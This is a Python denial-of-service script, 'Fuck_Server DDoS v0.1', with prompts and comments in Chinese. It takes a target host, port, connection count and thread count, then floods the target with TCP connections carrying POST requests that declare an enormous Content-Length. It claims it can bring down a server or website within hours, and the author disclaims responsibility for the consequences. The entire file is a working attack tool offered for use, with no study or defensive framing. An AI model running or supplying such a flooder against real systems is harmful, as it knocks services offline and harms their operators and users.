import socket,threading,re,sys
from time import sleep as sp
from os import system

def stwrite(txt):
    sys.stdout.write(txt)
welcome='''
   ███████╗██╗   ██╗ ██████╗██╗  ██╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
   ██╔════╝██║   ██║██╔════╝██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
   █████╗  ██║   ██║██║     █████╔╝     ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
   ██╔══╝  ██║   ██║██║     ██╔═██╗     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
   ██║     ╚██████╔╝╚██████╗██║  ██╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
   ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
'''
print(welcome)
print('Fuck_Server DDoS v0.1')
print('#本程序大约可在1-8小时内崩掉服务器或网站')
print('PS:所有因此工具造成的后果作者概不负责!')
HOST=input('ip或域名:')
PORT=input('端口(留空为80):')
PORT=80 if PORT=='' else int(PORT)
MAX_CONN=input('最大连接数(留空为默认,最好在200000及以上):')
MAX_CONN=200000 if MAX_CONN=='' else int(MAX_CONN)
if 'http://' in HOST:
    HOST=HOST.replace('http://','')
if 'https://' in HOST:
    HOST=HOST.replace('https://','')

PAGE = "/"
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
       "Content-Length: 1000000000\r\n"
       "Cookie: 666_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
socks = []

def ddos():
    global socks
    thread,b=re.findall('Thread-\\d+',str(threading.current_thread()))[0],1
    while True:
        stwrite(f'[+]{thread}第{b}波攻击!\n')
        for i in range(0, MAX_CONN):  # MAX_CONN允许最大连接数
            # AF_INET 表示 IPv4 地址，创建 TCP套接字，必须使用 SOCK_STREAM 作为套接字类型
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((HOST, PORT))
                s.send(bytes(buf,encoding='utf-8'))
                #print(f'[+]{thread}发送成功,conn={i}')
                socks.append(s)
                s.close()
            except Exception as ex:
                stwrite(f"[-]{thread}%s\n" % ex);sp(2)
        b+=1
Threads=[]
xc=int(input('线程数(建议20及以上):'))
xc=xc if xc>=1 else 1
for i in range(xc):
    thread=threading.Thread(target=ddos)
    thread.start()
    Threads.append(thread)
for i in Threads:
    i.join()
